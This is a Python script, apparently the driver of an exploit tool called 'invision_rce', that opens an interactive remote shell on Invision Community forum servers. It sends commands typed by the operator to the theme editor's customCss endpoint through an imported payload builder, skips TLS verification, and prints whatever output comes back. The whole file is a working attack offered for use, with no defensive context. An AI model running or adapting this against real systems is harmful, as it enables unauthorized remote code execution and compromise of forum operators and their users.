#!/usr/bin/env python3
import base64
import requests
import sys
from invision_rce.interface import show_banner, get_target_url
from invision_rce.utils import build_payload, extract_output

def run_shell(target):
    endpoint = f"{target}/index.php?app=core&module=system&controller=themeeditor&do=customCss"
    session = requests.Session()
    session.verify = False

    print(f"[+] Target: {endpoint}")
    print("[+] Type commands to execute on the remote host. 'exit' to quit.\n")

    while True:
        cmd = input("invision-shell# ").strip()
        if not cmd or cmd.lower() == "exit":
            break

        payload = build_payload(cmd)
        data = {
            "app": "core",
            "module": "system",
            "controller": "themeeditor",
            "do": "customCss",
            "content": payload
        }

        try:
            resp = session.post(endpoint, data=data, timeout=10)
            resp.raise_for_status()
        except Exception as e:
            print(f"[-] HTTP request failed: {e}")
            continue

        output = extract_output(resp.text)
        if output:
            print(output.strip())
        else:
            print("[-] Exploit failed or no output returned.")

if __name__ == "__main__":
    show_banner()
    target = sys.argv[1] if len(sys.argv) == 2 else get_target_url()
    run_shell(target)
